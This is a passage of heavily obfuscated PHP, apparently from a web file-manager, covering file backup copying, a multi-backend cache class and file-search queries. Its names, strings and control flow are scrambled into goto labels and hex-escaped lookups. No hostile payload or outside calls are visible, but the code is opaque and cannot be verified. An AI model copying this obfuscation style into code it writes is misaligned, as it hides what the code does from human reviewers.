$FÏéïñÜ‹£); $b“‘ÇœÀÏ§ = CONTROLLER_DIR . $eŸÑ´…í´Ç[745]; goto e²—“²å; Aõğ´¿áÂ: } } class BackupFile { public function __construct() { } public function index() { goto dõô›°Íãµ; Aƒ·¡«™Š™: $aò§ÌÖŒÖ‹ = !0; $DÜïŒ® ¥ô = $this->storeIds(); $e¡ßÍÎ¨¤Ÿ = 1; goto AÌ·İàî; a•Ö»õ„ñ‹: $b±ÛÓ“ó = $c²ÕÛ¢¹ = 0; do { $fî—ğ‰­‡ = $_SERVER[¶ªÕß‚ØÁŸ][754]; $AÚ°¼ §Û = Model($_SERVER[¶ªÕß‚ØÁŸ][732])->where($f­ÉïÒÁí™)->field($fî—ğ‰­‡)->order($_SERVER[¶ªÕß‚ØÁŸ][755])->selectPage($B£…‰®œ‹, $e¡ßÍÎ¨¤Ÿ); $cóĞõáàñ· = !empty($AÚ°¼ §Û[$_SERVER[¶ªÕß‚ØÁŸ][363]]) ? $AÚ°¼ §Û[$_SERVER[¶ªÕß‚ØÁŸ][363]] : array(); foreach ($cóĞõáàñ· as $F¼êæÔŒ§Å) { goto e“Ù‘°±; e“Ù‘°±: if (!$this->_fileExist($F¼êæÔŒ§Å, $B¥ë©²ğªÏ, $DÜïŒ® ¥ô)) { $CÊª¯Œª  -= 1; $DÓé¼´Â -= (int) $F¼êæÔŒ§Å[$_SERVER[¶ªÕß‚ØÁŸ][87]]; write_log("\x66\x69\x6c\145\x20\x6e\x6f\x74\40\x65\x78\x69\163\x74\x2e\x66\x69\x6c\145\111\104\72{$F¼êæÔŒ§Å[$_SERVER[¶ªÕß‚ØÁŸ][427]]}\x2c\40\x70\141\164\150\72{$F¼êæÔŒ§Å[$_SERVER[¶ªÕß‚ØÁŸ][85]]}", $_SERVER[¶ªÕß‚ØÁŸ][756]); continue; } $D·é‹˜‘ö« = $F¼êæÔŒ§Å[$_SERVER[¶ªÕß‚ØÁŸ][85]]; $f×çï„Û°é = "\x7b\x69\x6f\72{$d®´ß’‘“[$_SERVER[¶ªÕß‚ØÁŸ][704]]}\x7d" . substr($D·é‹˜‘ö«, strlen("\x7b\x69\157\72{$F¼êæÔŒ§Å[$_SERVER[¶ªÕß‚ØÁŸ][757]]}\175")); goto fì–³Œ£¹¿; B–Ï‘—ƒÒï: $Dêñ…ƒ½À += $F¼êæÔŒ§Å[$_SERVER[¶ªÕß‚ØÁŸ][87]]; $c²ÕÛ¢¹ += 1; $b±ÛÓ“ó += $F¼êæÔŒ§Å[$_SERVER[¶ªÕß‚ØÁŸ][87]]; goto dÑĞËİ¥×é; fì–³Œ£¹¿: if (IO::exist($f×çï„Û°é)) { $BõóÀ±†->updateFileEnd($F¼êæÔŒ§Å[$_SERVER[¶ªÕß‚ØÁŸ][28]], $F¼êæÔŒ§Å[$_SERVER[¶ªÕß‚ØÁŸ][87]]); } else { $f×çï„Û°é = get_path_father($f×çï„Û°é); IO::mkdir($f×çï„Û°é); if (!IO::copy($D·é‹˜‘ö«, $f×çï„Û°é, $_SERVER[¶ªÕß‚ØÁŸ][758])) { write_log($_SERVER[¶ªÕß‚ØÁŸ][759] . $D·é‹˜‘ö« . $_SERVER[¶ªÕß‚ØÁŸ][760] . $f×çï„Û°é . $_SERVER[¶ªÕß‚ØÁŸ][484], $_SERVER[¶ªÕß‚ØÁŸ][727]); $aò§ÌÖŒÖ‹ = !1; break; } } $a²Ç»¼¶ì = $F¼êæÔŒ§Å[$_SERVER[¶ªÕß‚ØÁŸ][427]]; $dˆ£İÔÂÛ÷ += 1; goto B–Ï‘—ƒÒï; dÑĞËİ¥×é: if ($Dêñ…ƒ½À >= 1024 * 1024 * 100) { $bÒÔ×îá·ñ = array($_SERVER[¶ªÕß‚ØÁŸ][761] => $a²Ç»¼¶ì, $_SERVER[¶ªÕß‚ØÁŸ][762] => $c²ÕÛ¢¹, $_SERVER[¶ªÕß‚ØÁŸ][763] => $b±ÛÓ“ó); Backup::set($bÒÔ×îá·ñ); $Dêñ…ƒ½À = $dˆ£İÔÂÛ÷ = 0; } goto d—˜İ²ÒÉ; d—˜İ²ÒÉ: } $Dç£¶³©ì² = count($cóĞõáàñ·); $e¡ßÍÎ¨¤Ÿ++; } while ($Dç£¶³©ì² == $B£…‰®œ‹); $BõóÀ±†->end(); goto DÅ—Õ»¤ÁÃ; DÅ—Õ»¤ÁÃ: $b„™ª­’Ëİ = $aò§ÌÖŒÖ‹ ? 1 : 0; $bÒÔ×îá·ñ = array($_SERVER[¶ªÕß‚ØÁŸ][764] => 1, $_SERVER[¶ªÕß‚ØÁŸ][716] => time(), $_SERVER[¶ªÕß‚ØÁŸ][722] => $b„™ª­’Ëİ, $_SERVER[¶ªÕß‚ØÁŸ][761] => $a²Ç»¼¶ì, $_SERVER[¶ªÕß‚ØÁŸ][753] => $DÓé¼´Â, $_SERVER[¶ªÕß‚ØÁŸ][752] => $CÊª¯Œª ); if ($dˆ£İÔÂÛ÷) { $bÒÔ×îá·ñ[$_SERVER[¶ªÕß‚ØÁŸ][762]] = $c²ÕÛ¢¹; $bÒÔ×îá·ñ[$_SERVER[¶ªÕß‚ØÁŸ][763]] = $b±ÛÓ“ó; } goto a¢Ù›Â•‹; a¢Ù›Â•‹: Backup::set($bÒÔ×îá·ñ); $this->_fileFilter($B¥ë©²ğªÏ); return !0; goto c£ó§¤¼ˆˆ; FåÚ§¸ÔàÔ: $BõóÀ±†->task[$_SERVER[¶ªÕß‚ØÁŸ][711]] = $DÓé¼´Â; $bÒÔ×îá·ñ = array($_SERVER[¶ªÕß‚ØÁŸ][752] => $CÊª¯Œª , $_SERVER[¶ªÕß‚ØÁŸ][753] => $DÓé¼´Â); Backup::set($bÒÔ×îá·ñ); goto Aƒ·¡«™Š™; AÌ·İàî: $B£…‰®œ‹ = 1000; $Dêñ…ƒ½À = $dˆ£İÔÂÛ÷ = 0; $B¥ë©²ğªÏ = array(); goto a•Ö»õ„ñ‹; dõô›°Íãµ: $d®´ß’‘“ = Backup::get(); $a²Ç»¼¶ì = $d®´ß’‘“[$_SERVER[¶ªÕß‚ØÁŸ][290]][$_SERVER[¶ªÕß‚ØÁŸ][177]][$_SERVER[¶ªÕß‚ØÁŸ][427]]; $f­ÉïÒÁí™ = array($_SERVER[¶ªÕß‚ØÁŸ][428] => array($_SERVER[¶ªÕß‚ØÁŸ][748], $a²Ç»¼¶ì), $_SERVER[¶ªÕß‚ØÁŸ][749] => array($_SERVER[¶ªÕß‚ØÁŸ][328], $d®´ß’‘“[$_SERVER[¶ªÕß‚ØÁŸ][704]])); goto d‰ÇÆëÁ†Ì; d‰ÇÆëÁ†Ì: $CÊª¯Œª  = (int) Model($_SERVER[¶ªÕß‚ØÁŸ][732])->where($f­ÉïÒÁí™)->count($_SERVER[¶ªÕß‚ØÁŸ][427]); $DÓé¼´Â = (int) Model($_SERVER[¶ªÕß‚ØÁŸ][732])->where($f­ÉïÒÁí™)->sum($_SERVER[¶ªÕß‚ØÁŸ][87]); $BõóÀ±† = new TaskFileTransfer($_SERVER[¶ªÕß‚ØÁŸ][750], $_SERVER[¶ªÕß‚ØÁŸ][727], $CÊª¯Œª , LNG($_SERVER[¶ªÕß‚ØÁŸ][728]) . $_SERVER[¶ªÕß‚ØÁŸ][729] . LNG($_SERVER[¶ªÕß‚ØÁŸ][751])); goto FåÚ§¸ÔàÔ; c£ó§¤¼ˆˆ: } private function _fileExist($Dİ…Ì¾öÓô, &$F§Ô»§ãÛ´, $b¦¢¹¨¸ä) { goto c£Œã‚­Ù; A„Ö™ àè : $F§Ô»§ãÛ´ = array_merge($F§Ô»§ãÛ´, array_to_keyvalue($Aõ¿øíŒ±, $AŞššÔ¦¦[33], $AŞššÔ¦¦[427])); return !1; goto AÑÕ”ÏÈœ“; c£Œã‚­Ù: $AŞššÔ¦¦ =& $_SERVER[¶ªÕß‚ØÁŸ]; $D©Ëïá¸° = $Dİ…Ì¾öÓô[$AŞššÔ¦¦[85]]; if (in_array($Dİ…Ì¾öÓô[$AŞššÔ¦¦[427]], $F§Ô»§ãÛ´)) { return !1; } goto DŸ½á¹ù©¿; F‚Ö’•¬³: if (IO::exist($dõ‡æ´´í˜)) { $F§Ô»§ãÛ´[] = $Dİ…Ì¾öÓô[$AŞššÔ¦¦[427]]; return !1; } $e¹Àœø¥éŠ = array($AŞššÔ¦¦[757] => $Dİ…Ì¾öÓô[$AŞššÔ¦¦[757]], $AŞššÔ¦¦[85] => array($AŞššÔ¦¦[765], "{$dõ‡æ´´í˜}\x25")); $Aõ¿øíŒ± = Model($AŞššÔ¦¦[732])->where($e¹Àœø¥éŠ)->field($AŞššÔ¦¦[428])->select(); goto A„Ö™ àè ; DŸ½á¹ù©¿: if (!in_array($Dİ…Ì¾öÓô[$AŞššÔ¦¦[757]], $b¦¢¹¨¸ä)) { return !1; } if (IO::exist($D©Ëïá¸°)) { return !0; } $dõ‡æ´´í˜ = get_path_father($D©Ëïá¸°); goto F‚Ö’•¬³; AÑÕ”ÏÈœ“: } private function _fileFilter($C´íŠŠ ĞŠ) { $bÆ®ïâÍÓä =& $_SERVER[¶ªÕß‚ØÁŸ]; if (empty($C´íŠŠ ĞŠ)) { return; } $AÓÖÚ“Ó— = array($bÆ®ïâÍÓä[427] => array($bÆ®ïâÍÓä[7], array_unique($C´íŠŠ ĞŠ))); $E¸ÅÚĞ†é = Model($bÆ®ïâÍÓä[766])->where($AÓÖÚ“Ó—)->field($bÆ®ïâÍÓä[377])->select(); foreach ($E¸ÅÚĞ†é as $DÙªçñ§î) { Model($bÆ®ïâÍÓä[766])->remove($DÙªçñ§î[$bÆ®ïâÍÓä[377]], !1); } } private function storeIds() { $F™é˜‡ÉÂ =& $_SERVER[¶ªÕß‚ØÁŸ]; $D„¢„Îğ‘ = Model($F™é˜‡ÉÂ[717])->listData(); return array_to_keyvalue($D„¢„Îğ‘, $F™é˜‡ÉÂ[33], $F™é˜‡ÉÂ[375]); } } class Cache { protected static $handle; protected static $memoryCache; public static function init() { goto FâÌ×¸ÊÆ; F•¾Àœ›Ì: switch ($aÍ²¾İÑÈì[$A¤»¤Šã¹[767]]) { case $A¤»¤Šã¹[17]: self::$handle = Model($A¤»¤Šã¹[769]); break; case $A¤»¤Šã¹[770]: self::$handle = new CacheRedis($eËãÄÅ›±, $c³ÖƒÏÄéø); break; case $A¤»¤Šã¹[771]: self::$handle = new CacheMemcached($eËãÄÅ›±, $c³ÖƒÏÄéø); break; case $A¤»¤Šã¹[177]: self::$handle = new CacheFile($eËãÄÅ›±, $c³ÖƒÏÄéø); break; default: break; } return self::$handle; goto A“³·‰¹ÈÍ; dÁ†İÜôñ: $aÍ²¾İÑÈì = $GLOBALS[$A¤»¤Šã¹[6]][$A¤»¤Šã¹[346]]; $eËãÄÅ›± = $aÍ²¾İÑÈì[$aÍ²¾İÑÈì[$A¤»¤Šã¹[767]]]; $c³ÖƒÏÄéø = $aÍ²¾İÑÈì[$A¤»¤Šã¹[768]]; goto F•¾Àœ›Ì; FâÌ×¸ÊÆ: $A¤»¤Šã¹ =& $_SERVER[¶ªÕß‚ØÁŸ]; if (self::$handle) { return self::$handle; } self::$memoryCache = array(); goto dÁ†İÜôñ; A“³·‰¹ÈÍ: } public static function initReset() { self::$handle = !1; self::$memoryCache = !1; } public static function key($D—ÉŞ§åªÛ) { if (is_array($D—ÉŞ§åªÛ) || is_object($D—ÉŞ§åªÛ)) { $D—ÉŞ§åªÛ = json_encode($D—ÉŞ§åªÛ); } $D—ÉŞ§åªÛ = rawurlencode($D—ÉŞ§åªÛ); return KOD_SITE_ID . $_SERVER[¶ªÕß‚ØÁŸ][80] . $D—ÉŞ§åªÛ; } public static function get($dò˜ò–ŠƒÔ) { $eëÍ¼¨¶¿ª = self::key($dò˜ò–ŠƒÔ); if (!isset(self::$memoryCache[$eëÍ¼¨¶¿ª])) { $b®½ªæó…— = self::init()->get($eëÍ¼¨¶¿ª); self::$memoryCache[$eëÍ¼¨¶¿ª] = unserialize($b®½ªæó…—); } return self::$memoryCache[$eëÍ¼¨¶¿ª]; } public static function set($AŞÉ¥¥ˆãŠ, $bõšÙÒËÈ‰, $b·‚¦¨å = false) { goto FÑŠ°¿Ä¿†; a‚æåï›ŠØ: CacheLock::unlock($AŞÉ¥¥ˆãŠ); return $a”¡§’ŠÍÁ; goto D•„…ã¬óî; FÑŠ°¿Ä¿†: $F†²İ‰Š = self::key($AŞÉ¥¥ˆãŠ); if (isset(self::$memoryCache[$F†²İ‰Š]) && self::$memoryCache[$F†²İ‰Š] === $bõšÙÒËÈ‰) { return !0; } if ($b·‚¦¨å === 0) { self::$memoryCache[$F†²İ‰Š] = $bõšÙÒËÈ‰; return !0; } goto c˜İáÍËÙì; c˜İáÍËÙì: CacheLock::lock($AŞÉ¥¥ˆãŠ); $a”¡§’ŠÍÁ = self::init()->set($F†²İ‰Š, serialize($bõšÙÒËÈ‰), $b·‚¦¨å); self::$memoryCache[$F†²İ‰Š] = $bõšÙÒËÈ‰; goto a‚æåï›ŠØ; D•„…ã¬óî: } public static function remove($Båƒ¥¿öà) { goto C¼éÑ…•øå; eèÕ‡ÀÇå: CacheLock::lock($Båƒ¥¿öà); $FßœÎ¢Îšê = self::init()->remove($aÜĞ©§ …–); CacheLock::unlock($Båƒ¥¿öà); goto D…Á¶ø§ù‰; D…Á¶ø§ù‰: return $FßœÎ¢Îšê; goto c¾æî×¨; C¼éÑ…•øå: $aÜĞ©§ …– = self::key($Båƒ¥¿öà); unset(self::$memoryCache[$aÜĞ©§ …–]); self::clearTimeout(); goto eèÕ‡ÀÇå; c¾æî×¨: } public static function clearMemory($e°÷Õ£ºŠ­ = false) { if ($e°÷Õ£ºŠ­) { $e°÷Õ£ºŠ­ = self::key($e°÷Õ£ºŠ­); unset(self::$memoryCache[$e°÷Õ£ºŠ­]); return; } self::$memoryCache = null; self::$memoryCache = array(); } public static function deleteAll() { self::$memoryCache = array(); if (method_exists(self::init(), $_SERVER[¶ªÕß‚ØÁŸ][772])) { self::init()->deleteAll(); } } public static function clearTimeout() { if (method_exists(self::init(), $_SERVER[¶ªÕß‚ØÁŸ][773])) { self::init()->clearTimeout(); } } } goto E¯Î×ÉÑ•¯; d®Ê‘‘Ì: class SourceListSearchModel extends SourceListMoveModel { public static function fileTypeWhere($Cîä˜”Àö¢) { goto AÓ‘Ë•¡é; EÂ÷˜æ™‹ö: if (!$D“©•µî‡°[$Fí­ëÊ®±ğ[170]]) { $C ¶¤×±§Í = array_to_keyvalue($bê ÅÚ±¾ø, $Fí­ëÊ®±ğ[33], $Fí­ëÊ®±ğ[170]); $A·¬®¼‰Ø³ = implode($Fí­ëÊ®±ğ[47], $C ¶¤×±§Í); $BÆ¹¬‹‰¥Š = $Fí­ëÊ®±ğ[2265]; } $D÷â¸Ï‰åµ = explode($Fí­ëÊ®±ğ[47], trim($A·¬®¼‰Ø³, $Fí­ëÊ®±ğ[47])); return array($BÆ¹¬‹‰¥Š, $D÷â¸Ï‰åµ); goto bçÏù×ÜÒ©; AÓ‘Ë•¡é: $Fí­ëÊ®±ğ =& $_SERVER[¶ªÕß‚ØÁŸ]; $bê ÅÚ±¾ø = KodIO::fileTypeList(); $D“©•µî‡° = $bê ÅÚ±¾ø[$Cîä˜”Àö¢]; goto C“Ş–ÚÌáŠ; C“Ş–ÚÌáŠ: if (!$D“©•µî‡°) { return array(); } $A·¬®¼‰Ø³ = $D“©•µî‡°[$Fí­ëÊ®±ğ[170]]; $BÆ¹¬‹‰¥Š = $Fí­ëÊ®±ğ[7]; goto EÂ÷˜æ™‹ö; bçÏù×ÜÒ©: } public function listPathType($eÂùëÍò´Ø) { $Aä¦§ÓË’° =& $_SERVER[¶ªÕß‚ØÁŸ]; $e™ò®ÂÉ±¡ = $this->fileTypeWhere($eÂùëÍò´Ø); if (!$e™ò®ÂÉ±¡) { return array(); } $EŠ¤¬ã×íİ = array($Aä¦§ÓË’°[529] => SourceModel::TYPE_USER, $Aä¦§ÓË’°[530] => USER_ID, $Aä¦§ÓË’°[526] => 0, $Aä¦§ÓË’°[527] => $e™ò®ÂÉ±¡); return $this->listSource($EŠ¤¬ã×íİ); } public function listSearch($EÇ¨Ä¥åù, $dæó¶á›¼– = 300) { goto f™À½–¼È•; dòÇî’×‡ç: $this->_listMake($eÏ¿øìˆ‚ø); return $eÏ¿øìˆ‚ø; goto däéÅ·±¦í; f™À½–¼È•: $D‘Ù×¸İ =& $_SERVER[¶ªÕß‚ØÁŸ]; if (isset($EÇ¨Ä¥åù[$D‘Ù×¸İ[2183]]) && $EÇ¨Ä¥åù[$D‘Ù×¸İ[2183]]) { $EÇ¨Ä¥åù[$D‘Ù×¸İ[2183]] = str_replace($D‘Ù×¸İ[1596], $D‘Ù×¸İ[2315], trim($EÇ¨Ä¥åù[$D‘Ù×¸İ[2183]])); } $A­Ó‰‡¨• = $this->_parseSearchWhere($EÇ¨Ä¥åù); goto cË†­ãŒÈŸ; dİœ«†„êç: $this->_listSearchDesc($eÏ¿øìˆ‚ø, $EÇ¨Ä¥åù, $b ‰à¹¶‡); $this->_listSearchTag($eÏ¿øìˆ‚ø, $EÇ¨Ä¥åù, $b ‰à¹¶‡); $this->_listDataApply($eÏ¿øìˆ‚ø[$D‘Ù×¸İ[363]]); goto dòÇî’×‡ç; c¥ªöæâ›Ê: $this->_listSearchBindPinyin($EÇ¨Ä¥åù, $A­Ó‰‡¨•, $Fœßˆ©®õ); $this->alias($D‘Ù×¸İ[495])->_makeOrder()->cache(null, 10); $eÏ¿øìˆ‚ø = $this->distinct(!0)->field($Fœßˆ©®õ)->where($A­Ó‰‡¨•)->selectPage($dæó¶á›¼–); goto dİœ«†„êç; cË†­ãŒÈŸ: if (!isset($A­Ó‰‡¨•[$D‘Ù×¸İ[405]])) { $A­Ó‰‡¨•[$D‘Ù×¸İ[405]] = 0; } $Fœßˆ©®õ = $D‘Ù×¸İ[2316]; $b ‰à¹¶‡ = $Fœßˆ©®õ; goto c¥ªöæâ›Ê; däéÅ·±¦í: } private function _listSearchTag(&$BË‹à®‚, $a„Ï÷¾ÈùŒ, $CÀ„‹È¦Êñ) { goto d÷›Õ¨Ğ‡·; Aê§İá×±µ: $aš¤˜Â­Ê… = array(); $Aà©ÅğƒÚ„ = $a„Ï÷¾ÈùŒ[$EÂ…ô§ó–±[2183]]; foreach ($C†šÄ¹îÜ´ as $e°Ñ¡¿šõ») { $föÉõÇ´Òø = $e°Ñ¡¿šõ»[$EÂ…ô§ó–±[28]]; $E–ğ²°ØÌ = str_replace($EÂ…ô§ó–±[50], $EÂ…ô§ó–±[33], Pinyin::encode($föÉõÇ´Òø)); if (stripos($föÉõÇ´Òø, $Aà©ÅğƒÚ„) !== !1 || stripos($E–ğ²°ØÌ, $Aà©ÅğƒÚ„) !== !1) { $aš¤˜Â­Ê…[] = $e°Ñ¡¿šõ»[$EÂ…ô§ó–±[375]]; } } goto fÚæŠå¬Ï; fÚæŠå¬Ï: if (!$aš¤˜Â­Ê…) { return; } $Eƒõ»²­¢¾ = array($EÂ…ô§ó–±[401] => array($EÂ…ô§ó–±[7], $aš¤˜Â­Ê…)); $eĞÜìÇ£í = Model($EÂ…ô§ó–±[402])->field($EÂ…ô§ó–±[85])->where($Eƒõ»²­¢¾)->select(); goto däÅ•“Ô›á; däÅ•“Ô›á: $eĞÜìÇ£í = array_to_keyvalue($eĞÜìÇ£í, $EÂ…ô§ó–±[33], $EÂ…ô§ó–±[85]); $DŠŞÀÅËŒÅ = array_unique($eĞÜìÇ£í); $this->_listSearchMerge($BË‹à®‚, $a„Ï÷¾ÈùŒ, $CÀ„‹È¦Êñ, $DŠŞÀÅËŒÅ); goto E¢ÈŠÓ§‰; d÷›Õ¨Ğ‡·: $EÂ…ô§ó–± =& $_SERVER[¶ªÕß‚ØÁŸ]; if (!$a„Ï÷¾ÈùŒ[$EÂ…ô§ó–±[2183]] || $BË‹à®‚[$EÂ…ô§ó–±[360]][$EÂ…ô§ó–±[349]] > 1) { return; } $C†šÄ¹îÜ´ = Model($EÂ…ô§ó–±[2317])->listData(); goto Aê§İá×±µ; E¢ÈŠÓ§‰: } private function _listSearchDesc(&$FìŸëõ ¥À, $A ´¿çà, $aœÏµôë–ë) { goto dœïˆ‡¼´¹; dœïˆ‡¼´¹: $Fã«˜¡…ÉÒ =& $_SERVER[¶ªÕß‚ØÁŸ]; if (!$A ´¿çà[$Fã«˜¡…ÉÒ[2183]] || $FìŸëõ ¥À[$Fã«˜¡…ÉÒ[360]][$Fã«˜¡…ÉÒ[349]] > 1) { return; } $c Üé˜ = $this->listSearchChildren($A ´¿çà[$Fã«˜¡…ÉÒ[469]]); goto a¸„Ñö÷Ñ; a¸„Ñö÷Ñ: $c Üé˜ = array_unique($c Üé˜); if (!$c Üé˜) { return; } $DäÆÊÚÙíè = array($Fã«˜¡…ÉÒ[377] => array($Fã«˜¡…ÉÒ[7], $c Üé˜), $Fã«˜¡…ÉÒ[99] => $Fã«˜¡…ÉÒ[413], $Fã«˜¡…ÉÒ[368] => array($Fã«˜¡…ÉÒ[765], $Fã«˜¡…ÉÒ[2185] . $A ´¿çà[$Fã«˜¡…ÉÒ[2183]] . $Fã«˜¡…ÉÒ[2185])); goto BÜçÆ­èö; BÜçÆ­èö: $b¿İ½„«Ãï = Model($Fã«˜¡…ÉÒ[512])->field($Fã«˜¡…ÉÒ[377])->where($DäÆÊÚÙíè)->select(); $døÙ‚Œ£çò = array_to_keyvalue($b¿İ½„«Ãï, $Fã«˜¡…ÉÒ[33], $Fã«˜¡…ÉÒ[377]); $this->_listSearchMerge($FìŸëõ ¥À, $A ´¿çà, $aœÏµôë–ë, $døÙ‚Œ£çò); goto D‘ÄÒ¢©¢‡; D‘ÄÒ¢©¢‡: } private function _listSearchMerge(&$A„öÛ¨õïÏ, $d§ÍèœØö›, $f½†èÅ±Ş, $DŠÚ¹Øí¸) { goto aæÂƒ˜õ¿í; bâä¯Š§ÅÊ: $EÛí¾ëó­‘ = array_diff($DŠÚ¹Øí¸, $cÁÄ«ˆ‰‡´); if (!$EÛí¾ëó­‘) { return; } $c¬Œ×…™‘Ö = array($Bëöçö¨Â [377] => array($Bëöçö¨Â [7], $EÛí¾ëó­‘)); goto B§Ä½ï¶ÀŠ; A­áÛ‡ãÄ×: foreach ($B—éš§¿©ì as $BİÆËË‚²×) { $B‡›ƒ‡¤Îœ = $Bëöçö¨Â [47] . $d§ÍèœØö›[$Bëöçö¨Â [469]] . $Bëöçö¨Â [47]; if (stripos($BİÆËË‚²×[$Bëöçö¨Â [467]], $B‡›ƒ‡¤Îœ) !== !1) { $C¹ìŸ»‹Îˆ[] = $BİÆËË‚²×; } } $A„öÛ¨õïÏ[$Bëöçö¨Â [363]] = array_merge($C¹ìŸ»‹Îˆ, $A„öÛ¨õïÏ[$Bëöçö¨Â [363]]); $A„öÛ¨õïÏ[$Bëöçö¨Â [360]][$Bëöçö¨Â [361]] += count($C¹ìŸ»‹Îˆ); goto aÊ¥ñÕ§Ã; aæÂƒ˜õ¿í: $Bëöçö¨Â  =& $_SERVER[¶ªÕß‚ØÁŸ]; if (!$DŠÚ¹Øí¸) { return; } $cÁÄ«ˆ‰‡´ = array_to_keyvalue($A„öÛ¨õïÏ[$Bëöçö¨Â [363]], $Bëöçö¨Â [33], $Bëöçö¨Â [377]); goto bâä¯Š§ÅÊ; B§Ä½ï¶ÀŠ: $B—éš§¿©ì = $this->field($f½†èÅ±Ş)->where($c¬Œ×…™‘Ö)->select(); if (!$B—éš§¿©ì) { return; } $C¹ìŸ»‹Îˆ = array(); goto A­áÛ‡ãÄ×; aÊ¥ñÕ§Ã: } public function listSearchChildren($F£ÙÇˆö¬–, $b³®Ñìàá = 5000) { goto c¢ãµº¿Êó; fÆô‰ÆáìÒ: $FŠŒŒÍ£Ïê = array($bÑ†µµ’[467] => array($bÑ†µµ’[765], $bäø£é°ÖÛ[$bÑ†µµ’[467]] . $bäø£é°ÖÛ[$bÑ†µµ’[377]] . $bÑ†µµ’[492])); $cµ•åÔ×Í = $this->field($bÑ†µµ’[377])->cache(null, 600)->where($FŠŒŒÍ£Ïê)->count(); if ($cµ•åÔ×Í > $b³®Ñìàá) { return $this->_listSearchChildrenNear($F£ÙÇˆö¬–, $b³®Ñìàá); } goto BÍƒñ…î; c¢ãµº¿Êó: $bÑ†µµ’ =& $_SERVER[¶ªÕß‚ØÁŸ]; $F‡§À¬ëŒ‹ = array(); $bäø£é°ÖÛ = $this->sourceInfo($F£ÙÇˆö¬–); goto fÆô‰ÆáìÒ; BÍƒñ…î: $CÃŒòá£ˆ = $this->field($bÑ†µµ’[377])->where($FŠŒŒÍ£Ïê)->select(); $F‡§À¬ëŒ‹ = array_to_keyvalue($CÃŒòá£ˆ, $bÑ†µµ’[33], $bÑ†µµ’[377]); return $F‡§À¬ëŒ‹; goto f¸Ò À³£; f¸Ò À³£: } private function _listSearchChildrenNear($f„ÀÏ„à, $C»¢¨Şä¤) { goto D´óÔŠ¹í; e°ÕøÂ¼Ÿ: if (!$Còƒ‚ëŠÂ‡) { return $E›Î½‹ÎƒÜ; } $BÛ‚ïÄÂÀÛ = array($cãÈÛİÑ¢Õ[469] => array($cãÈÛİÑ¢Õ[7], $Còƒ‚ëŠÂ‡)); $DÀÏñ´Úİ° = $this->field($cãÈÛİÑ¢Õ[2318])->where($BÛ‚ïÄÂÀÛ)->select(); goto F¾·‰¹´‹°; F¾·‰¹´‹°: $E›Î½‹ÎƒÜ = array_merge($E›Î½‹ÎƒÜ, array_to_keyvalue($DÀÏñ´Úİ°, $cãÈÛİÑ¢Õ[33], $cãÈÛİÑ¢Õ[377])); $E›Î½‹ÎƒÜ = array_slice($E›Î½‹ÎƒÜ, 0, $C»¢¨Şä¤); return $E›Î½‹ÎƒÜ; goto e—š¶é™™á; C÷œ¿óÑ£”: $DÀÏñ´Úİ° = $this->field($cãÈÛİÑ¢Õ[2318])->where($BÛ‚ïÄÂÀÛ)->select(); $Còƒ‚ëŠÂ‡ = array_to_keyvalue(array_filter_by_field($DÀÏñ´Úİ°, $cãÈÛİÑ¢Õ[378], $cãÈÛİÑ¢Õ[93]), $cãÈÛİÑ¢Õ[33], $cãÈÛİÑ¢Õ[377]); $E›Î½‹ÎƒÜ = array_merge($E›Î½‹ÎƒÜ, array_to_keyvalue($DÀÏñ´Úİ°, $cãÈÛİÑ¢Õ[33], $cãÈÛİÑ¢Õ[377])); goto e°ÕøÂ¼Ÿ; D´óÔŠ¹í: $cãÈÛİÑ¢Õ =& $_SERVER[¶ªÕß‚ØÁŸ]; $E›Î½‹ÎƒÜ = array(); $BÛ‚ïÄÂÀÛ = array($cãÈÛİÑ¢Õ[469] => $f„ÀÏ„à); goto C÷œ¿óÑ£”; e—š¶é™™á: } private function _listSearchBindPinyin($b‡ùòØŒñŠ, &$c”Šò¢“°³, &$dŒÚá´éÚ) { goto eºàÚÌÑŒ®; eºàÚÌÑŒ®: $F¤Û»âÉ” =& $_SERVER[¶ªÕß‚ØÁŸ]; if (!Input::check($b‡ùòØŒñŠ[$F¤Û»âÉ”[2183]], $F¤Û»âÉ”[315]) || strlen($b‡ùòØŒñŠ[$F¤Û»âÉ”[2183]]) < 2) { return; } $DÌº•ç¯õê = "\114\105\x46\124\x20\112\117\111\x4e\40{$this->tablePrefix}\x69\157\x5f\x73\x6f\165\162\143\x65\x5f\155\145\x74\141\40\155\145\x74\x61\x20\157\156\40\x73\157\165\162\x63\145\x2e\x73\x6f\x75\x72\143\145\x49\x44\40\x3d\x20\155\x65\x74\141\x2e\x73\x6f\165\x72\x63\x65\111\x44"; goto b‡è˜®Ûİ°; F¸“Ï–¢: unset($c”Šò¢“°³[$F¤Û»âÉ”[28]]); foreach ($c”Šò¢“°³ as $EÜšŠÅç¢ => $CÑá¯²Î¹¥) { $aùÓéøÉø´[$F¤Û»âÉ”[2320] . $EÜšŠÅç¢] = $CÑá¯²Î¹¥; } $b‘±ÑÔ™Ñù = array($F¤Û»âÉ”[491], $F¤Û»âÉ”[2185] . $b‡ùòØŒñŠ[$F¤Û»âÉ”[2183]] . $F¤Û»âÉ”[2185]); goto d÷‹™Ì»…; b‡è˜®Ûİ°: $aùÓéøÉø´ = array(); $dŒÚá´éÚ = str_replace(array($F¤Û»âÉ”[62], $F¤Û»âÉ”[50], $F¤Û»âÉ”[2319]), $F¤Û»âÉ”[33], $dŒÚá´éÚ); $dŒÚá´éÚ = $F¤Û»âÉ”[2320] . str_replace($F¤Û»âÉ”[47], $F¤Û»âÉ”[2321], $dŒÚá´éÚ); goto F¸“Ï–¢; d÷‹™Ì»…: $aùÓéøÉø´[] = array($F¤Û»âÉ”[2322] => $b‘±ÑÔ™Ñù, $F¤Û»âÉ”[920] => $F¤Û»âÉ”[2187], array($F¤Û»âÉ”[2323] => $b‘±ÑÔ™Ñù, $F¤Û»âÉ”[2324] => array($F¤Û»âÉ”[7], array($F¤Û»âÉ”[424], $F¤Û»âÉ”[423])))); $this->join($DÌº•ç¯õê); $c”Šò¢“°³ = $aùÓéøÉø´; goto eÅ‚§±ˆ›†; eÅ‚§±ˆ›†: } private function _parseSearchWhere($E©˜Œ£Ç‡) { goto aª‡¤×¨õ–; eÃæÊ±ºØ: if (isset($E©˜Œ£Ç‡[$Fæø£×äÎ[2183]]) && $E©˜Œ£Ç‡[$Fæø£×äÎ[2183]]) { $E¼ª÷·‘‚á = $E©˜Œ£Ç‡[$Fæø£×äÎ[2183]]; $A»É®Øá² = explode($Fæø£×äÎ[50], $E¼ª÷·‘‚á); if (strlen($E¼ª÷·‘‚á) > 2 && (substr($E¼ª÷·‘‚á, 0, 1) == $Fæø£×äÎ[123] && substr($E¼ª÷·‘‚á, -1) == 